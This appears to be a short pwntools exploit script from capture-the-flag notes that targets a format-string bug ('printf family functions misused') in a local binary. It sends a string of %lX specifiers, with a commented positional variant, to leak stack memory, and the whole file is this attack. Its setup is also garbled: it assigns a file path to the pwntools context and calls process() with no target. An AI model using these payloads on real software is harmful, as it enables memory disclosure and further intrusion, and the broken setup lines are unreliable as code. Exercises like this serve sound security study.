# printf family functions misused
# use %X to check, %lx

#%3$lX

from pwn import *

binary.context = context = './filename'

payload="%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX."
#modified payload = "%6$lX.%7$lX.%8$lX.%9$lX.%10$lX."

p = process()
p.recv()
p.sendline(payload)
print(p.recvall())
